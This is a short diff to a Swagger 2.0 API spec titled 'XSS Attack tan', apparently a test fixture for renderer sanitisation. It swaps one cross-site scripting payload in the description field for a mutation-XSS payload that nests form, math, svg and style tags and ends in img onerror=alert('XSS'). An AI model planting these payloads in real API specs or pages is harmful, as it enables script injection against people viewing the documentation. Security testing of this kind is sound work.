@@ -2,7 +2,7 @@ swagger: "2.0"
 info:
   title: XSS Attack tan
   description: |
-    ccc<![CDATA[ ><img src onerror=alert(1)> ]]>
+    xss<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(\'XSS\') src>">
 
   version: production
 basePath: /JSSResource/
